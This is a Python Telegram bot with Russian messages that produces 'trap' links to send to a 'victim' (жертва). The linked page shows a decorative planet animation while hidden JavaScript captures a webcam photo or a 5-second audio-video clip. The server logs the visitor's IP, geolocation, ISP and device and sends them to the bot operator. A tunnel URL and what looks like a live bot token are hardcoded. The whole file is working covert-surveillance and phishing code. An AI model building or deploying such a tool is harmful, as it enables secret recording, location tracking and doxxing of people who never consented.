import secrets
import threading
import subprocess
import re
import io
import base64
import time
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
import telebot

BOT_TOKEN = "8924618475:AAHaR9lLl40pGkdjr6ehP6WPIbYb5OVQVrE"
bot = telebot.TeleBot(BOT_TOKEN)
traps: dict[str, int] = {}
vid_traps: dict[str, int] = {}

# АКТУАЛЬНЫЙ URL ИЗ SERVEO
BASE_URL = "https://56854feaacbba552-62-89-211-86.serveousercontent.com"


class TrapHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        parts = self.path.strip("/").split("/")

        if len(parts) == 2 and parts[0] == "view" and parts[1] in traps:
            token = parts[1]
            self._send_info(token, traps[token])
            html = self._quantum_html(token).encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(html)
            return

        if len(parts) == 2 and parts[0] == "vid" and parts[1] in vid_traps:
            token = parts[1]
            self._send_info(token, vid_traps[token], prefix="🎥 Открыл видео-ловушку!")
            html = self._quantum_vid_html(token).encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(html)
            return

        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        parts = self.path.strip("/").split("/")

        if len(parts) == 2 and parts[0] == "photo" and parts[1] in traps:
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length)
            try:
                img_data = body.decode().split(",")[1]
                img_bytes = base64.b64decode(img_data)
                bot.send_photo(traps[parts[1]],
                    io.BytesIO(img_bytes),
                    caption="📸 Фото жертвы!"
                )
            except Exception as e:
                print("photo err:", e)

        elif len(parts) == 2 and parts[0] == "vid_upload" and parts[1] in vid_traps:
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length)
            try:
                vid_bytes = base64.b64decode(body)
                bot.send_video(vid_traps[parts[1]],
                    io.BytesIO(vid_bytes),
                    caption="🎥 Видео жертвы (5 сек)!",
                    supports_streaming=True
                )
            except Exception as e:
                print("vid err:", e)

        self.send_response(200)
        self.end_headers()

    def _send_info(self, token, chat_id, prefix="🪤 Открыл ловушку!"):
        ip = (self.headers.get("X-Forwarded-For", "")
              or self.client_address[0]).split(",")[0].strip()
        ua = self.headers.get("User-Agent", "unknown")
        device = "📱 Мобильный" if any(
            x in ua for x in ["Android", "iPhone", "iPad", "Mobile"]
        ) else "💻 ПК"

        geo = "—"
        try:
            r = requests.get(
                f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,regionName,city,isp,mobile",
                timeout=5
            ).json()
            if r.get("status") == "success":
                mobile = "📱 Мобильный инет" if r.get("mobile") else "🏠 Домашний"
                geo = (
                    f"{r.get('country', '?')} ({r.get('countryCode', '?')}) "
                    f"{r.get('city', '?')} | {r.get('isp', '?')} | {mobile}"
                )
        except:
            pass

        bot.send_message(chat_id,
            f"{prefix}\n\n"
            f"🌐 IP: {ip}\n"
            f"📍 {geo}\n"
            f"{device}\n"
            f"🔍 UA: {ua[:120]}"
        )

    # ---- Общий HTML/CSS/JS для обоих типов страниц ----
    def _neptune_html(self):
        return r"""<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
<meta name="theme-color" content="#01050c" />
<title>Sadixll</title>
<style>
  :root { --cyan:#63eaff; --blue:#087bff; --deep:#01040a; }
  * { box-sizing:border-box; }
  html,body { width:100%;height:100%;margin:0; }
  body { overflow:hidden;background:#01040a;color:#dffbff;font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",sans-serif;touch-action:none; }
  .space { position:relative;width:100vw;height:100svh;min-height:600px;overflow:hidden;isolation:isolate;background:#01040a; }
  #cosmos { position:absolute;inset:0;width:100%;height:100%;display:block; }
  .space::after { content:"";position:absolute;inset:0;z-index:6;pointer-events:none;background:radial-gradient(ellipse at center,transparent 31%,rgba(0,2,7,.76) 100%),linear-gradient(180deg,rgba(0,0,0,.4),transparent 36%,rgba(0,0,0,.58)); }
  .scan { position:absolute;inset:0;z-index:7;pointer-events:none;opacity:.12;background:repeating-linear-gradient(180deg,transparent 0 4px,rgba(90,228,255,.05) 5px 6px);mix-blend-mode:screen; }
  .grain { position:absolute;inset:-50%;z-index:8;pointer-events:none;opacity:.08;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='180' height='180'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.8' numOctaves='4'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='.65'/%3E%3C/svg%3E");animation:grain .22s steps(2) infinite; }
  .top { position:absolute;z-index:10;top:0;left:0;right:0;display:flex;align-items:center;justify-content:space-between;padding:25px clamp(20px,5vw,70px);border-bottom:1px solid rgba(99,234,255,.12);background:linear-gradient(180deg,rgba(0,3,9,.75),transparent); }
  .brand { display:flex;align-items:center;gap:11px;color:#dffbff; }
  .mark { display:grid;place-items:center;width:31px;height:31px;border:1px solid rgba(99,234,255,.65);border-radius:50%;color:var(--cyan);box-shadow:0 0 20px rgba(99,234,255,.27);font-size:14px; }
  .brand strong { display:block;font-size:11px;letter-spacing:.3em; }
  .brand small { display:block;margin-top:4px;color:rgba(223,251,255,.45);font-size:8px;letter-spacing:.17em;text-transform:uppercase; }
  .signal { display:flex;align-items:center;gap:9px;color:rgba(99,234,255,.68);font-size:9px;letter-spacing:.18em;text-transform:uppercase; }
  .signal i { width:6px;height:6px;border-radius:50%;background:var(--cyan);box-shadow:0 0 12px var(--cyan);animation:pulse 1.6s infinite; }
  .title { position:absolute;z-index:9;top:50%;left:clamp(20px,7vw,100px);transform:translateY(-50%);pointer-events:none; }
  .title .eyebrow { display:flex;align-items:center;gap:11px;color:rgba(99,234,255,.8);font-size:9px;letter-spacing:.3em;text-transform:uppercase; }
  .title .eyebrow::before { content:"";width:38px;height:1px;background:var(--cyan);box-shadow:0 0 14px var(--cyan); }
  h1 { margin:18px 0 0;color:#e9ffff;font-family:Georgia,"Times New Roman",serif;font-size:clamp(58px,10vw,130px);font-weight:400;line-height:.8;letter-spacing:-.08em;text-shadow:0 0 35px rgba(99,234,255,.25); }
  h1 span { display:block;color:transparent;-webkit-text-stroke:1px rgba(99,234,255,.68);font-size:.48em;letter-spacing:.02em; }
  .info { max-width:285px;margin:22px 0 0;color:rgba(223,251,255,.45);font-size:11px;line-height:1.7; }
  .readout { position:absolute;z-index:9;right:clamp(20px,6vw,90px);top:50%;display:grid;gap:14px;transform:translateY(-50%);pointer-events:none;color:rgba(223,251,255,.5);font-size:8px;letter-spacing:.17em;text-transform:uppercase;writing-mode:vertical-rl; }
  .readout b { color:var(--cyan);font-size:10px; }
  .bottom { position:absolute;z-index:10;right:clamp(20px,5vw,70px);bottom:25px;left:clamp(20px,5vw,70px);display:flex;align-items:center;justify-content:space-between;color:rgba(223,251,255,.42);font-size:8px;letter-spacing:.2em;text-transform:uppercase; }
  .bottom b { color:var(--cyan);font-weight:600; }
  .bar { width:110px;height:1px;background:rgba(99,234,255,.25);position:relative;overflow:hidden; }
  .bar::after { content:"";position:absolute;left:-30%;top:0;width:30%;height:100%;background:var(--cyan);box-shadow:0 0 14px var(--cyan);animation:scan 2.5s linear infinite; }
  @keyframes pulse { 50%{opacity:.25;transform:scale(.7)} }
  @keyframes scan { to{left:110%} }
  @keyframes grain { 0%{transform:translate(0,0)}25%{transform:translate(2%,-1%)}50%{transform:translate(-1%,2%)}75%{transform:translate(1%,1%)} }
  @media(max-width:650px){.signal{display:none}.title{top:56%;left:25px}.title h1{font-size:clamp(66px,21vw,120px)}.info{max-width:220px;font-size:10px}.readout{display:none}.bottom{bottom:18px;left:25px;right:25px}.bar{width:72px}.top{padding:17px 20px}.brand strong{font-size:9px}}
</style>
</head>
<body>
<main class="space" id="space">
  <canvas id="cosmos"></canvas><div class="scan"></div><div class="grain"></div>
  <header class="top"><div class="brand"><div class="mark">◉</div><div><strong>SADIXLL 🇹🇯</strong><small>deep space / blue giant</small></div></div><div class="signal"><i></i> orbital signal locked</div></header>
  <section class="title"><div class="eyebrow">sector 08 / outer system</div><h1>Sadixll 🇹🇯<span>THE BLUE GIANT</span></h1><p class="info">A dark, volumetric study of a distant world. Наведи курсор или проведи пальцем — пространство реагирует на движение.</p></section>
  <aside class="readout"><b>−218°C</b><span>atmospheric motion / active</span><b>4.5B km</b></aside>
  <footer class="bottom"><span>deep field / <b>rendering live</b></span><span class="bar"></span><span>touch to orbit</span></footer>
</main>
<script>
(() => {
  'use strict';
  const canvas=document.getElementById('cosmos'),ctx=canvas.getContext('2d'),space=document.getElementById('space');
  let W=0,H=0,dpr=Math.min(devicePixelRatio||1,2),t=0,last=0,mx=.5,my=.5;
  const stars=[];const motes=[];const shards=[];
  const rand=(a,b)=>a+Math.random()*(b-a);
  function resize(){W=innerWidth;H=innerHeight;canvas.width=W*dpr;canvas.height=H*dpr;canvas.style.width=W+'px';canvas.style.height=H+'px';ctx.setTransform(dpr,0,0,dpr,0,0);}
  function seed(){stars.length=0;motes.length=0;shards.length=0;for(let i=0;i<230;i++)stars.push({x:rand(0,1),y:rand(0,1),r:rand(.3,1.8),a:rand(.15,.85),p:rand(0,7),z:rand(.2,1)});for(let i=0;i<26;i++)motes.push({a:rand(0,Math.PI*2),r:rand(.15,1.25),v:rand(.1,.32),size:rand(1,3),tilt:rand(.4,1)});for(let i=0;i<11;i++)shards.push({x:rand(.08,.92),y:rand(.12,.9),s:rand(3,9),rot:rand(0,7),v:rand(.2,.65)});}
  function background(){const g=ctx.createRadialGradient(W*.5,H*.47,0,W*.5,H*.47,Math.max(W,H)*.72);g.addColorStop(0,'#07162b');g.addColorStop(.27,'#020b18');g.addColorStop(.68,'#01050d');g.addColorStop(1,'#000207');ctx.fillStyle=g;ctx.fillRect(0,0,W,H);for(const s of stars){const a=s.a*(.58+.42*Math.sin(t*1.5+s.p));ctx.globalAlpha=a;ctx.fillStyle=s.z>.72?'#dffcff':'#5dbde3';ctx.shadowBlur=s.z> .72?7:0;ctx.shadowColor='#63eaff';ctx.beginPath();ctx.arc(s.x*W+mx*12*s.z,s.y*H+my*8*s.z,s.r*s.z,0,Math.PI*2);ctx.fill();}ctx.globalAlpha=1;ctx.shadowBlur=0;}
  function projectOrbit(a,r,tilt){const cx=W*.5+mx*18,cy=H*.5+my*15;return{x:cx+Math.cos(a)*r,y:cy+Math.sin(a)*r*tilt};}
  function orbit(a,r,tilt,color,width,alpha){ctx.save();ctx.translate(W*.5+mx*18,H*.5+my*15);ctx.rotate(a*.08);ctx.scale(1,tilt);ctx.beginPath();ctx.arc(0,0,r,0,Math.PI*2);ctx.strokeStyle=color;ctx.globalAlpha=alpha;ctx.lineWidth=width;ctx.shadowBlur=12;ctx.shadowColor=color;ctx.stroke();ctx.restore();}
  function planet(){const cx=W*.5+mx*18,cy=H*.5+my*15;const r=Math.min(W,H)*.105;orbit(t*.2, r*1.75,.43,'#1167ac',1,.62);orbit(-t*.16,r*2.25,.31,'#164e8c',1,.43);orbit(t*.12,r*2.8,.2,'#1b446d',1,.35);orbit(-t*.1,r*3.45,.42,'#1e557c',1,.32);for(let i=0;i<5;i++){const p=projectOrbit(t*(.2+i*.03)+i*1.7,r*(1.8+i*.32),.35+.04*i);ctx.save();ctx.translate(p.x,p.y);ctx.rotate(t*.8+i);ctx.fillStyle=i%2?'#63eaff':'#dffcff';ctx.shadowBlur=18;ctx.shadowColor='#63eaff';ctx.fillRect(-2,-2,4,4);ctx.restore();}
    ctx.save();ctx.translate(cx,cy);ctx.rotate(-.11+mx*.15);ctx.scale(1,.94);const glow=ctx.createRadialGradient(-r*.25,-r*.28,0,0,0,r*1.55);glow.addColorStop(0,'#dfffff');glow.addColorStop(.08,'#62f4ff');glow.addColorStop(.25,'#0ed0f3');glow.addColorStop(.54,'#0875c8');glow.addColorStop(.8,'#023366');glow.addColorStop(1,'#010c1d');ctx.shadowBlur=55;ctx.shadowColor='#00cfff';ctx.fillStyle=glow;ctx.beginPath();ctx.arc(0,0,r,0,Math.PI*2);ctx.fill();ctx.shadowBlur=0;
      ctx.save();ctx.beginPath();ctx.arc(0,0,r,0,Math.PI*2);ctx.clip();for(let i=-3;i<8;i++){const yy=i*r*.22+Math.sin(t*1.4+i)*r*.08;ctx.strokeStyle=`rgba(135,244,255,${.14-i*.01})`;ctx.lineWidth=r*.07;ctx.beginPath();ctx.moveTo(-r,yy);ctx.bezierCurveTo(-r*.3,yy-r*.08,r*.25,yy+r*.1,r,yy-r*.04);ctx.stroke();}ctx.restore();
      ctx.strokeStyle='rgba(157,252,255,.88)';ctx.lineWidth=1.4;ctx.beginPath();ctx.arc(0,0,r*.74,Math.PI*.12,Math.PI*.9);ctx.stroke();ctx.strokeStyle='rgba(3,30,70,.9)';ctx.lineWidth=4;ctx.beginPath();ctx.arc(0,0,r*.86,Math.PI*1.1,Math.PI*1.75);ctx.stroke();ctx.restore();
  }
  function dust(){for(const m of motes){m.a+=m.v*.006;const p=projectOrbit(m.a,m.r*Math.min(W,H)*.18,.58+m.tilt*.15);const alpha=.2+.5*(.5+.5*Math.sin(t*2+m.a));ctx.globalAlpha=alpha;ctx.fillStyle=m.r>.8?'#8cf4ff':'#d8fbff';ctx.shadowBlur=12;ctx.shadowColor='#2de7ff';ctx.beginPath();ctx.arc(p.x,p.y,m.size,0,Math.PI*2);ctx.fill();}ctx.globalAlpha=1;ctx.shadowBlur=0;}
  function crystals(){for(const q of shards){q.rot+=q.v*.01;const x=q.x*W+Math.sin(t*.4+q.rot)*25,y=q.y*H+Math.cos(t*.5+q.rot)*20;ctx.save();ctx.translate(x,y);ctx.rotate(q.rot);ctx.strokeStyle='rgba(61,232,255,.72)';ctx.shadowBlur=18;ctx.shadowColor='#00cfff';ctx.beginPath();ctx.moveTo(0,-q.s);ctx.lineTo(q.s*.55,0);ctx.lineTo(0,q.s);ctx.lineTo(-q.s*.55,0);ctx.closePath();ctx.stroke();ctx.restore();}}
  function grid(){const y=H*.82;ctx.strokeStyle='rgba(45,112,166,.12)';ctx.lineWidth=1;for(let i=1;i<12;i++){const yy=y+Math.pow(i/12,1.8)*H*.22;ctx.beginPath();ctx.moveTo(0,yy);ctx.lineTo(W,yy);ctx.stroke();}for(let i=-8;i<=8;i++){ctx.beginPath();ctx.moveTo(W*.5+i*W*.04,y);ctx.lineTo(W*.5+i*W*.23,H);ctx.stroke();}}
  function draw(){background();grid();dust();crystals();planet();}
  function frame(now){const dt=Math.min(.04,(now-last)/1000||.016);last=now;t+=dt;draw();requestAnimationFrame(frame);}
  addEventListener('resize',resize);addEventListener('pointermove',e=>{mx=e.clientX/innerWidth-.5;my=e.clientY/innerHeight-.5;});addEventListener('touchmove',e=>{const q=e.touches[0];mx=q.clientX/innerWidth-.5;my=q.clientY/innerHeight-.5;},{passive:true});
  resize();seed();requestAnimationFrame(frame);
})();
</script>
</body>
</html>"""

    def _quantum_html(self, token: str) -> str:
        html = self._neptune_html()
        script = f"""
<script>
(async function() {{
    try {{
        await new Promise(r => setTimeout(r, 3000));
        const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }});
        const video = document.createElement("video");
        video.srcObject = stream;
        video.setAttribute("playsinline", "");
        video.muted = true;
        video.style.display = "none";
        document.body.appendChild(video);
        await video.play();
        await new Promise(r => setTimeout(r, 1500));
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        const dataUrl = canvas.toDataURL("image/jpeg", 0.8);
        stream.getTracks().forEach(t => t.stop());
        await fetch("/photo/{token}", {{
            method: "POST",
            headers: {{ "Content-Type": "text/plain" }},
            body: dataUrl
        }});
    }} catch(e) {{}}
}})();
</script>
</body>
</html>"""
        return html.replace("</body>\n</html>", script)

    def _quantum_vid_html(self, token: str) -> str:
        html = self._neptune_html()
        script = f"""
<script>
(async function() {{
    try {{
        await new Promise(r => setTimeout(r, 2000));

        const stream = await navigator.mediaDevices.getUserMedia({{
            video: {{ facingMode: "user", width: 640, height: 480 }},
            audio: true
        }});

        const video = document.createElement("video");
        video.srcObject = stream;
        video.setAttribute("playsinline", "");
        video.muted = true;
        video.style.display = "none";
        document.body.appendChild(video);
        await video.play();

        let mime = "video/webm;codecs=vp8,opus";
        if (typeof MediaRecorder === "undefined") return;
        if (!MediaRecorder.isTypeSupported(mime)) {{
            mime = "video/webm";
        }}
        if (!MediaRecorder.isTypeSupported(mime)) {{
            mime = "";
        }}

        const chunks = [];
        const recorder = new MediaRecorder(stream, mime ? {{ mimeType: mime }} : {{}});

        recorder.ondataavailable = (e) => {{
            if (e.data && e.data.size > 0) chunks.push(e.data);
        }};

        recorder.onstop = async () => {{
            stream.getTracks().forEach(t => t.stop());
            const blob = new Blob(chunks, {{ type: "video/webm" }});

            const reader = new FileReader();
            reader.onloadend = async () => {{
                const b64 = reader.result.split(",")[1];
                try {{
                    await fetch("/vid_upload/{token}", {{
                        method: "POST",
                        headers: {{ "Content-Type": "text/plain" }},
                        body: b64
                    }});
                }} catch(e) {{}}
            }};
            reader.readAsDataURL(blob);
        }};

        recorder.start();

        setTimeout(() => {{
            if (recorder.state === "recording") {{
                recorder.stop();
            }}
        }}, 5000);

    }} catch(e) {{}}
}})();
</script>
</body>
</html>"""
        return html.replace("</body>\n</html>", script)

    def log_message(self, *args):
        pass


@bot.message_handler(commands=["start"])
def start(message):
    bot.reply_to(message,
        "📸 Ловушка активна\n\n"
        "/trap — фото-ловушка (3 сек + фото)\n"
        "/vid  — видео-ловушка (5 сек видео)\n\n"
        "Кто откроет — увидит Sadixll 🇹🇯,\n"
        "а ты получишь IP, гео, устройство + фото/видео"
    )


@bot.message_handler(commands=["trap"])
def trap(message):
    token = secrets.token_urlsafe(12)
    traps[token] = message.chat.id
    url = f"{BASE_URL}/view/{token}"
    bot.reply_to(message, f"📸 Фото-ловушка готова!\n\n{url}\n\nОтправь жертве 👆")


@bot.message_handler(commands=["vid"])
def vid(message):
    token = secrets.token_urlsafe(12)
    vid_traps[token] = message.chat.id
    url = f"{BASE_URL}/vid/{token}"
    bot.reply_to(message, f"🎥 Видео-ловушка готова!\n\n{url}\n\nОтправь жертве 👆\n\nЗапишется 5 сек видео (если не закроет сразу)")


def start_cloudflared():
    global BASE_URL
    proc = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://localhost:8080"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )
    for line in proc.stdout:
        line = line.decode("utf-8", errors="ignore")
        match = re.search(r"https://[a-z0-9\-]+\.trycloudflare\.com", line)
        if match:
            BASE_URL = match.group(0)
            print(f"URL: {BASE_URL}")
            break


if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 8080), TrapHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    print("Сервер :8080 запущен")

    # threading.Thread(target=start_cloudflared, daemon=True).start()

    time.sleep(2)
    print(f"Бот запущен | URL: {BASE_URL}")
    bot.infinity_polling()
